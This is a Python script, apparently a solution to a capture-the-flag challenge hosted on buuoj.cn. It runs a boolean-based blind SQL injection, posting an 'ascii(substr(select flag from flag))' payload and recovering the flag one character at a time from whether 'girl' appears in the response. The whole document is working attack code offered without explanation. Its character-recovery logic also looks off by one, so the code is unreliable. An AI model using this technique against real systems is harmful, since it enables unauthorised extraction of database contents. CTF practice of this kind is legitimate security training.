import time
import requests
url = "http://5fc0d2e2-b824-47c8-8f4b-2bccda17cd87.node5.buuoj.cn/"
result = ""
for i in range(1, 50):
    for j in range(32, 128):
        time.sleep(0.1)
        payload = "(ascii(substr((select(flag)from(flag)),{m},1))>{n})"
        response = requests.post(url=url, data={'id':payload.format(m=i,n=j)})
        if response.text.find('girl') == -1:
            result += chr(j)
            print(j)
            break
    print("正在注出flag:", result)
print("flag的值为:", result)